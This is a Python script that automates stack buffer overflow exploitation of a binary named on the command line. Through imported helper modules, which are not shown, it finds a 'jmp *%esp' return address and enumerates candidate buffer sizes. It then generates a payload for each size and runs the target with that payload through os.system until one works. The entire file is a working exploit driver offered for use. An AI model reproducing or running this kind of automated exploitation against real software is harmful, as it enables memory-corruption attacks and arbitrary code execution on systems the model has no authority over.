#!/usr/bin/python

import os
import sys
import isExploitable
import retaddr
import buff
import generatePayload

binaryName=sys.argv[1]


#Investigate the type of vulnerabilties existing in the Binary
isExploitable.isVulnerable(binaryName)

#Extracting the necessary Return address for Exploits
addr_esp=retaddr.retAddrEsp() #function to get the return address of jump *%esp
#print(addr_esp)

#addr_eax=retaddr.retAddrEax() #function to get the return address of call *%eax
#print(addr_eax)

#convert the address into little Endian format
address=retaddr.retLilEndian(addr_esp) #input the address of the instruction jump *%esp or call *%eax
#address=retaddr.retLilEndian(addr_eax)
#List all functions in the binary
fun_list=buff.list_fun()
print('The list of functions found in binary:')
for x in fun_list:print(x)

#List of possible buffer sizes
buff_list=buff.list_buff(fun_list)
for x in buff_list:print(x)

#construct payload for the derrived buffer list
for i,buff_item in enumerate(buff_list):
	p_arg=generatePayload.payloadGenESP(address,buff_item)
	#p_arg=generatePayload.payloadGenEAX(address,buff_item)
	print('The generated payload is: \n' + p_arg)
	
	#execute the exploit by injecting the payload
	f =open("payload1", "w+")
	f.write("%s" % p_arg)
	f.close()

	print('\n\n' + 'Executing the exploit.......')
	sys.stdout.flush()
	exploitCommand= './'+binaryName+ ' '+'`cat payload1`'
	os.system(exploitCommand)
	print("failed! try next buffer value....")


#arg1 = generatePayload.payloadGenESP(address,buff_list) #payload for jum*%esp
#print('The generated payload is: \n' + arg1)
#arg2 = generatePayload.payloadGenEAX(address,buff_list)

#execute the exploit by injecting the payload
#f =open("payload1", "w+")
#f.write("%s" % arg2)
#f.close()






